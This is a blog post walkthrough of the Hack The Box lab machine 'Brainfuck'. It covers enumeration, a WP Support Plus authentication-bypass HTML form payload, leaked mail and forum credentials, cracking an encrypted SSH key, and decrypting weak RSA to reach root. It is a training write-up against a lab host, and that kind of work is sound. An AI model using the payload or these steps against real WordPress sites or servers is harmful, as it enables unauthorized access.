<!doctype html> <head> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1"> <meta name=theme-color content=#333333> <base href=/logbook/ > <link href=global.css rel=stylesheet> <link href=fonts.css rel=stylesheet> <link href=highlight.css rel=stylesheet> <link href=manifest.json rel=manifest> <link href=as-logo2.ico rel=icon type=image/png> <link href=client/main.2380911310.css rel=stylesheet> <noscript id=sapper-head-start></noscript><title>HTB - Brainfuck</title><meta content=article property=og:type><meta content="HTB - Brainfuck" property=og:title><meta name=Description content=""><meta content="" property=og:description><meta name=twitter:card content=summary_large_image><meta name=twitter:title value="HTB - Brainfuck"><meta name=twitter:description content=""><meta name=twitter:label1 value="Published on"><meta name=twitter:data1 value="Apr 24, 2021"><meta name=twitter:label2 value="Reading Time"><meta name=twitter:data2 value="5 min read"><noscript id=sapper-head-end></noscript> </head> <body> <div id=sapper> <div class="svelte-v25qrq layout"> <header class=svelte-y9ah38> <a href=/ > <img alt=Sapper src=as-logo2.ico class=svelte-1u41owj> </a> <nav class=svelte-16qpxtx> <a href=. class=svelte-16qpxtx>Home</a> <a href=blog rel=prefetch class="svelte-16qpxtx selected">Blog</a> <a href=https://anu-bhav.github.io class=svelte-16qpxtx>Website</a> </nav> </header> <main class=svelte-v25qrq> <header class=svelte-ww3xvk> <p class=svelte-ww3xvk>April 24, 2021 ~ 5 min read</p> <h1 class=svelte-ww3xvk>HTB - Brainfuck</h1> <a href=pdf/Brainfuck.pdf target=_blank rel=nofollow class=svelte-ww3xvk id=pdf_link>View As PDF</a> <hr class=svelte-ww3xvk> </header> <div class=container> <article class=content> <h1 id=brainfuck---10101017>Brainfuck - 10.10.10.17</h1> <h1 id=enumeration>Enumeration</h1> <h2 id=nmap>Nmap</h2> <pre class=language-bash><code class=language-bash>nmap -p- -T4 -oA nmap/quick 10.10.10.17</code></pre><pre class=language-bash><code class=language-bash># Nmap 7.91 scan initiated Fri Apr 23 09:17:23 2021 as: nmap -p- -T4 -oA nmap/quick 10.10.10.17
Nmap scan report for www.brainfuck.htb (10.10.10.17)
Host is up (0.24s latency).
Not shown: 65530 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

# Nmap done at Fri Apr 23 09:21:49 2021 -- 1 IP address (1 host up) scanned in 265.59 seconds</code></pre><h2 id=website>Website</h2> <h3 id=https10101017><a href=https://10.10.10.17 target=_blank rel=nofollow>https://10.10.10.17</a></h3> <p><img alt="" src=Brainfuck.assets/image-20210423092517149.png></p> <h3 id=ssl-cert>SSL Cert</h3> <p><img alt="" src=brainfuck.assets/image-20210423092213672.png></p> <p>user : <strong><a href=mailto:orestis@brainfuck.htb target=_blank rel=nofollow>orestis@brainfuck.htb</a></strong></p> <p>DNS Name: <strong><a href=http://www.brainfuck.htb target=_blank rel=nofollow>www.brainfuck.htb</a>, sup3rs3cr3t.brainfuck.htb</strong></p> <p>The dns names are added to <strong>/etc/hosts</strong></p> <p><img alt="" src=brainfuck.assets/image-20210423092844295.png></p> <h3 id=sup3rs3cr3tbrainfuckhtb>sup3rs3cr3t.brainfuck.htb</h3> <p>sup3rs3cr3t.brainfuck.htb is a forum webpage.</p> <p><img alt="" src=brainfuck.assets/image-20210423100437959.png></p> <h3 id=wwwbrainfuckhtb---brainfuckhtb><a href=http://www.brainfuck.htb target=_blank rel=nofollow>www.brainfuck.htb</a> -> brainfuck.htb</h3> <p><strong><a href=http://www.brainfuck.htb target=_blank rel=nofollow>www.brainfuck.htb</a></strong> redirects to <strong>brainfuck.htb</strong> which is a <em>wordpress</em> website.</p> <p><img alt="" src=brainfuck.assets/image-20210423100221583.png></p> <p><strong>wpscan</strong> is ran against the <strong><a href=https://brainfuck.htb target=_blank rel=nofollow>https://brainfuck.htb</a></strong></p> <pre class=language-bash><code class=language-bash>wpscan --api-token "zwHNCijstkXlttJouhoslFZG0MYms5Bvks9FMVexaAs" --url "https://brainfuck.htb" --disable-tls-checks -o wpscan.log</code></pre><p><img alt="" src=brainfuck.assets/image-20210423104733666.png></p> <pre class=language-bash><code class=language-bash>searchsploit WP Support Plus</code></pre><p><img alt="" src=brainfuck.assets/image-20210423120100898.png></p> <pre class=language-bash><code class=language-bash>wpscan --url "https://brainfuck.htb" --disable-tls-checks --enumerate u -o wpscan_enumerate_user.log </code></pre><p><img alt="" src=brainfuck.assets/image-20210423104514064.png></p> <p>Users found:</p> <ul> <li>admin</li> <li>administrator</li> </ul> <h1 id=exploitation>Exploitation</h1> <h2 id=brainfuckhtb>brainfuck.htb</h2> <h3 id=searchploit>Searchploit</h3> <p>During enumeration, it was found that the <strong>WP Support Plus</strong> plugin is vulnerable to a <strong>Privilege Escalation</strong> attack.</p> <pre class=language-bash><code class=language-bash>searchsploit WP Support Plus </code></pre><p><img alt="" src=brainfuck.assets/image-20210424055551012.png></p> <pre class=language-><code class=language->searchsploit -x php/webapps/41006.txt </code></pre><p><img alt="" src=brainfuck.assets/image-20210424060023915.png></p> <h3 id=privilege-escalation-to-admin-on-wordpress>Privilege Escalation to admin on wordpress</h3> <p>Using the users enumerated from wpscan, this attack can be performed. The payload was modified as show below.</p> <p><img alt="" src=brainfuck.assets/image-20210424063910309.png></p> <pre class=language-html><code class=language-html><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://brainfuck.htb/wp-admin/admin-ajax.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>orestis@brainfuck.htb<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginGuestFacebook<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>The file is hosted using the command below.</p> <pre class=language-bash><code class=language-bash>python3 -m http.server 80</code></pre><p><img alt="" src=brainfuck.assets/image-20210424063117997.png></p> <p>it is then viewed using a browser.</p> <p><img alt="" src=brainfuck.assets/image-20210424063217601.png></p> <p><strong>Vulnerability Explanation:</strong></p> <p>When inspecting the traffic in Burpsuite, it can be concluded that the WP Support Plus plugin sets an authenticated cookie to the user without the need of a password.</p> <p><img alt="" src=brainfuck.assets/image-20210424064212334.png></p> <p><img alt="" src=brainfuck.assets/image-20210424064603321.png></p> <p>Once the script is ran, when refreshing the wordpress site, the cookies take effect and, the attacker is automatically authenticated.</p> <p><img alt="" src=brainfuck.assets/image-20210424064609386.png></p> <h3 id=smtp-credentials-leaked>SMTP Credentials leaked</h3> <p>Going to the <strong>Easy WP SMTP</strong> plugin, information about the user can be found.</p> <p><img alt="" src=brainfuck.assets/image-20210424065221953.png></p> <p>In developers console, the password can be seen in cleartext.</p> <p><img alt="" src=brainfuck.assets/image-20210424065348596.png></p> <pre class=language-html><code class=language-html><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>swpsmtp_smtp_password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kHGuERB29DNiNE<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>SMTP Credential: </p> <p><strong>orestis:kHGuERB29DNiNE</strong></p> <h3 id=evolution-mail-client>Evolution Mail Client</h3> <p>Evolution mail client is configured as shown below to see user orestis mails.</p> <p><img alt="" src=brainfuck.assets/image-20210424070158690.png></p> <p><img alt="" src=brainfuck.assets/image-20210424070425913.png></p> <p><img alt="" src=brainfuck.assets/image-20210424070431548.png></p> <p><img alt="" src=brainfuck.assets/image-20210424070507569.png></p> <p>After configuring evolution, user orestis mail can be viewed.</p> <p><img alt="" src=brainfuck.assets/image-20210424070539798.png></p> <p>New credentials are revealed, it is for the forum found on the subdomain <strong>sup3rs3cr3t.brainfuck.htb</strong> </p> <p><img alt="" src=brainfuck.assets/image-20210424070838384.png></p> <pre class=language-><code class=language->Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards</code></pre><h2 id=sup3rs3cr3tbrainfuckhtb-1>sup3rs3cr3t.brainfuck.htb</h2> <p>Using the above credentials, the user orestic can now be accessed on the forum <strong>sup3rs3cr3t.brainfuck.htb</strong>.</p> <p>There are 3 topics listed in the forum:</p> <ul> <li>Key</li> <li>SSH Access</li> <li>Development</li> </ul> <p><img alt="" src=brainfuck.assets/image-20210424071528025.png></p> <p>It can be observed that user orestis always signs with the phrase <em>Orestis - Hacking for fun and profit</em> on topic <strong>SSH Access</strong>.</p> <p><img alt="" src=brainfuck.assets/image-20210424072018596.png></p> <p>However on topic <strong>Key</strong>, the page is encrypted. But the same pattern can be seen as orestis always signs his posts with the same phrase <em>Orestis - Hacking for fun and profit</em>.</p> <p><img alt="" src=brainfuck.assets/image-20210424072421469.png> </p> <h3 id=decryption-of-the-posts>Decryption of the posts</h3> <p>After researching the encryption method, it was concluded that it is a one time pad encryption technique also known as Vernam Cipher (One Time Pad Vigenere).</p> <p>Using the website <a href=https://www.boxentriq.com/code-breaking/one-time-pad target=_blank rel=nofollow>https://www.boxentriq.com/code-breaking/one-time-pad</a>, the key was found to be <strong>BRAINFUCKMYBRAINFUCKMYBRAINFU</strong></p> <p><img alt="" src=brainfuck.assets/image-20210424073446093.png></p> <p>The same result can be crossed check on the website <a href=https://www.dcode.fr/vernam-cipher-vigenere target=_blank rel=nofollow>https://www.dcode.fr/vernam-cipher-vigenere</a></p> <p><img alt="" src=brainfuck.assets/image-20210424073724663.png></p> <p>When decrypting what appeared to be a link <a href=mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr target=_blank rel=nofollow>mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr</a> with the pad <strong>FUCKMYBRAINFUCKMYBRAINFUCKMYBR</strong>, it resulted to reveal a link to the user orestis ssh public key <a href=https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa target=_blank rel=nofollow>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></p> <p><img alt="" src=brainfuck.assets/image-20210424074619202.png></p> <pre class=language-bash><code class=language-bash>curl -sk https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -o orestis.enc 
cat orestis.enc </code></pre><p>The ssh key is an encrypted key and it needs to be decrypted in order to ssh as the orestis user.</p> <p><img alt="" src=brainfuck.assets/image-20210424081016859.png></p> <pre class=language-><code class=language->-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----</code></pre><p>The password is cracked using john.</p> <pre class=language-powershell><code class=language-powershell># cracked on windows
python ./run/ssh2john.py ./hashes/brainfuck-orestis.enc.txt | Out-File ./hashes/brainfuck-orestis.txt

# if having error: Error: UTF-16 BOM seen in input file.
# open ./hashes/brainfuck-orestis.txt in sublime and save with encoding utf-8

./run/john.exe --wordlist="D:/Documents/Bug Bounty/SecLists/Passwords/Leaked-Databases/rockyou.txt" ./hashes/brainfuck-orestis.txt</code></pre><p><img alt="" src=brainfuck.assets/image-20210424083739076.png></p> <pre class=language-><code class=language->3poulakia!       (.\hashes\brainfuck-orestis.enc.txt)</code></pre><p>SSH credential:</p> <p><strong>orestis:3poulakia!</strong></p> <h3 id=ssh-as-orestis>SSH as orestis</h3> <p>Using the password <strong>3poulakia!</strong>, brainfuck.htb can be access as the user orestis.</p> <pre class=language-bash><code class=language-bash>chmod 600 orestis.enc 
ssh -i orestis.enc orestis@brainfuck.htb </code></pre><p><img alt="" src=brainfuck.assets/image-20210424084309613.png></p> <h3 id=usertxt>User.txt</h3> <p>User.txt can be found in the home directory of orestis.</p> <p><img alt="" src=brainfuck.assets/image-20210424084553996.png></p> <blockquote> <p>user.txt: 2c11cfbc5b959f73ac15a3310bd097c9</p> </blockquote> <h3 id=roottxt>Root.txt</h3> <p>There are some uncommon files which are only readable by orestis</p> <ul> <li>encrypt.sage</li> <li>debug.txt</li> <li>output.txt </li> </ul> <p><img alt="" src=brainfuck.assets/image-20210424084857346.png></p> <p>The file <strong>encrypt.sage</strong> is a python script which looks to be doing an RSA cipher on /root/root.txt</p> <p><img alt="" src=brainfuck.assets/image-20210424085249183.png> </p> <p><strong>encrypt.sage</strong>:</p> <pre class=language-python><code class=language-python>nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')</code></pre><p><strong>output.txt</strong> contains <strong>c</strong>, and <strong>debug.txt</strong> contains <strong>p</strong>,<strong>q</strong> and <strong>e</strong> respectively.</p> <p><img alt="" src=brainfuck.assets/image-20210424105245632.png></p> <p>The content of <strong>/root/root.txt</strong> can be easily decrypted given all the above information.</p> <p>Using the website <a href=https://www.dcode.fr/rsa-cipher target=_blank rel=nofollow>https://www.dcode.fr/rsa-cipher</a>, the original content of <strong>/root/root.txt</strong> can be obtained.</p> <p><img alt="" src=brainfuck.assets/image-20210424090253551.png></p> <blockquote> <p>root.txt: 6efc1a5dbb8904751ce6566a305bb8ef</p> </blockquote> </article> <hr> <button class="back-to-top hidden svelte-h76b9j"> <svg aria-hidden=true class="" id="" role=img style=height:1em;line-height:.75em;font-size:1.33333em;vertical-align:-.225em;overflow:visible viewBox="0 0 448 512" xmlns=http://www.w3.org/2000/svg> <g transform="translate(256 256)"> <g transform=""> <path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z" fill=currentColor transform="translate(-256 -256)"></path> </g> </g> </svg> </button> <div class=svelte-1b2y202> <img alt="Anubhavsingh Sawdagur" src=profile-pic.png class=svelte-1b2y202> <p class=svelte-1b2y202> Hi, I'm <strong class=highlight>Anubhav</strong>. I'm an Ethical Hacker, Software Engineer and Network Engineer from Mauritius. <br> You can find me on <a href=https://www.instagram.com/_anu_bhav_/ target=_blank>Instagram</a>, <a href=https://www.twitter.com/0_Pr0t0typ3/ target=_blank>Twitter</a>, <a href=https://www.facebook.com/anubhav.s.0809/ target=_blank>Facebook</a> or <a href=https://www.linkedin.com/in/anubhavsingh-sawdagur/ target=_blank>LinkedIn</a>. See more of my work on <a href="https://github.com/Anu-bhav?tab=repositories" target=_blank>GitHub</a> or read about me on my <a href=https://anu-bhav.github.io/ target=_blank>Website</a> </p> </div> </div> </main> <footer class=svelte-v25qrq> <span> Â© 2021 Personal Blog. Powered by <a href=https://sapper.svelte.dev target=_blank>Sapper</a>. Template by <a href=https://anu-bhav.github.io target=_blank>Anubhavsingh Sawdagur</a>. </span> </footer> </div></div> <script>__SAPPER__={baseUrl:"/logbook",preloaded:[void 0,null,{pdf_location:"pdf\u002FBrainfuck.pdf",has_pdf:true,post:{title:"HTB - Brainfuck",slug:"Brainfuck",html:"\u003Ch1 id=\"brainfuck---10101017\"\u003EBrainfuck - 10.10.10.17\u003C\u002Fh1\u003E\n\u003Ch1 id=\"enumeration\"\u003EEnumeration\u003C\u002Fh1\u003E\n\u003Ch2 id=\"nmap\"\u003ENmap\u003C\u002Fh2\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Enmap -p- -T4 -oA nmap\u002Fquick 10.10.10.17\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003E# Nmap 7.91 scan initiated Fri Apr 23 09:17:23 2021 as: nmap -p- -T4 -oA nmap\u002Fquick 10.10.10.17\nNmap scan report for www.brainfuck.htb (10.10.10.17)\nHost is up (0.24s latency).\nNot shown: 65530 filtered ports\nPORT    STATE SERVICE\n22\u002Ftcp  open  ssh\n25\u002Ftcp  open  smtp\n110\u002Ftcp open  pop3\n143\u002Ftcp open  imap\n443\u002Ftcp open  https\n\n# Nmap done at Fri Apr 23 09:21:49 2021 -- 1 IP address (1 host up) scanned in 265.59 seconds\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"website\"\u003EWebsite\u003C\u002Fh2\u003E\n\u003Ch3 id=\"https10101017\"\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002F10.10.10.17\"\u003Ehttps:\u002F\u002F10.10.10.17\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003E\u003Cimg src=\"Brainfuck.assets\u002Fimage-20210423092517149.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"ssl-cert\"\u003ESSL Cert\u003C\u002Fh3\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423092213672.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Euser : \u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"mailto:orestis@brainfuck.htb\"\u003Eorestis@brainfuck.htb\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EDNS Name: \u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002Fwww.brainfuck.htb\"\u003Ewww.brainfuck.htb\u003C\u002Fa\u003E, sup3rs3cr3t.brainfuck.htb\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe dns names are added to \u003Cstrong\u003E\u002Fetc\u002Fhosts\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423092844295.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"sup3rs3cr3tbrainfuckhtb\"\u003Esup3rs3cr3t.brainfuck.htb\u003C\u002Fh3\u003E\n\u003Cp\u003Esup3rs3cr3t.brainfuck.htb is a forum webpage.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423100437959.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"wwwbrainfuckhtb---brainfuckhtb\"\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002Fwww.brainfuck.htb\"\u003Ewww.brainfuck.htb\u003C\u002Fa\u003E -&gt; brainfuck.htb\u003C\u002Fh3\u003E\n\u003Cp\u003E\u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"http:\u002F\u002Fwww.brainfuck.htb\"\u003Ewww.brainfuck.htb\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E redirects to \u003Cstrong\u003Ebrainfuck.htb\u003C\u002Fstrong\u003E which is a \u003Cem\u003Ewordpress\u003C\u002Fem\u003E website.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423100221583.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Ewpscan\u003C\u002Fstrong\u003E is ran against the \u003Cstrong\u003E\u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fbrainfuck.htb\"\u003Ehttps:\u002F\u002Fbrainfuck.htb\u003C\u002Fa\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ewpscan --api-token \"zwHNCijstkXlttJouhoslFZG0MYms5Bvks9FMVexaAs\" --url \"https:\u002F\u002Fbrainfuck.htb\" --disable-tls-checks -o wpscan.log\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423104733666.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Esearchsploit WP Support Plus\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423120100898.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ewpscan --url \"https:\u002F\u002Fbrainfuck.htb\" --disable-tls-checks --enumerate u -o wpscan_enumerate_user.log \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210423104514064.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EUsers found:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003Eadmin\u003C\u002Fli\u003E\n\u003Cli\u003Eadministrator\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch1 id=\"exploitation\"\u003EExploitation\u003C\u002Fh1\u003E\n\u003Ch2 id=\"brainfuckhtb\"\u003Ebrainfuck.htb\u003C\u002Fh2\u003E\n\u003Ch3 id=\"searchploit\"\u003ESearchploit\u003C\u002Fh3\u003E\n\u003Cp\u003EDuring enumeration, it was found that the \u003Cstrong\u003EWP Support Plus\u003C\u002Fstrong\u003E plugin is vulnerable to a \u003Cstrong\u003EPrivilege Escalation\u003C\u002Fstrong\u003E attack.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Esearchsploit WP Support Plus \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424055551012.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003Esearchsploit -x php\u002Fwebapps\u002F41006.txt \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424060023915.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"privilege-escalation-to-admin-on-wordpress\"\u003EPrivilege Escalation to admin on wordpress\u003C\u002Fh3\u003E\n\u003Cp\u003EUsing the users enumerated from wpscan, this attack can be performed.\nThe payload was modified as show below.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424063910309.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-html\"\u003E\u003Ccode class=\"language-html\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Eform\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Emethod\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Epost\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Eaction\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Ehttps:\u002F\u002Fbrainfuck.htb\u002Fwp-admin\u002Fadmin-ajax.php\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token 